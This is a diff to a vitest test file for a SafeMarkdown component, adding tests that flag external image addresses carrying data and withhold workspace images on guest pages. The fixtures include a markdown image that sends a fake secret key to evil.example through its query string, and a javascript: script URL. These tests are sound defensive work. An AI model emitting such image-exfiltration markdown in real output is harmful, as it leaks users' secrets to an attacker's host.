@@ -2,7 +2,7 @@ import { render, screen } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { describe, expect, it } from "vitest";
 
-import { SafeMarkdown, classifyImageSrc } from "@/components/markdown/SafeMarkdown";
+import { SafeMarkdown, addressCarriesData, classifyImageSrc } from "@/components/markdown/SafeMarkdown";
 import { I18nProvider } from "@/lib/i18n";
 
 /**
@@ -65,10 +65,48 @@ describe("SafeMarkdown", () => {
     expect(screen.getByTestId("markdown-external-image")).toHaveTextContent("chart.png");
   });
 
+  it("shows the whole address and says when it carries data, not just the host", () => {
+    // The chip names the host; `?d=<secret>` is the payload. One click on "external image from
+    // evil.example" would deliver it, so the address is in the tooltip and the query is flagged.
+    show("![status](https://evil.example/pixel.png?d=sk-live-123)");
+    const link = screen.getByTestId("markdown-external-image");
+    expect(link.getAttribute("title")).toContain("https://evil.example/pixel.png?d=sk-live-123");
+    expect(link.getAttribute("title")).toContain("status");
+    expect(screen.getByTestId("markdown-external-image-data")).toHaveTextContent(/carries data/i);
+  });
+
+  it("does not flag an address that carries nothing but a location", () => {
+    show("![logo](https://example.org/logo.png)");
+    expect(screen.getByTestId("markdown-external-image").getAttribute("title")).toContain("https://example.org/logo.png");
+    expect(screen.queryByTestId("markdown-external-image-data")).toBeNull();
+  });
+
+  it("withholds the workspace endpoint when told to, and still renders embedded bytes", () => {
+    // The guest page: this origin's image endpoint is the OWNER's workspace there.
+    const { container } = render(
+      <I18nProvider>
+        <SafeMarkdown allowLocalImages={false}>{`![a](/api/fs/image?path=out/chart.png) ![b](${PIXEL})`}</SafeMarkdown>
+      </I18nProvider>,
+    );
+    const srcs = [...container.querySelectorAll("img")].map((img) => img.getAttribute("src"));
+    expect(srcs).toEqual([PIXEL]);
+    expect(screen.getByTestId("markdown-withheld-image")).toBeInTheDocument();
+    // Not a link either — that would open the owner's file in the guest's browser.
+    expect(container.querySelector('a[href*="/api/fs/image"]')).toBeNull();
+  });
+
   it("drops a script URL entirely", () => {
     const { container } = show("![x](javascript:alert(1))");
     expect(container.querySelector("img")).toBeNull();
     expect(screen.queryByTestId("markdown-external-image")).toBeNull();
+  });
+});
+
+describe("addressCarriesData", () => {
+  it("is true for a query or a fragment and false for a bare location", () => {
+    expect(addressCarriesData("https://h.example/a.png?d=1", ORIGIN)).toBe(true);
+    expect(addressCarriesData("https://h.example/a.png#x", ORIGIN)).toBe(true);
+    expect(addressCarriesData("https://h.example/a.png", ORIGIN)).toBe(false);
   });
 });
 
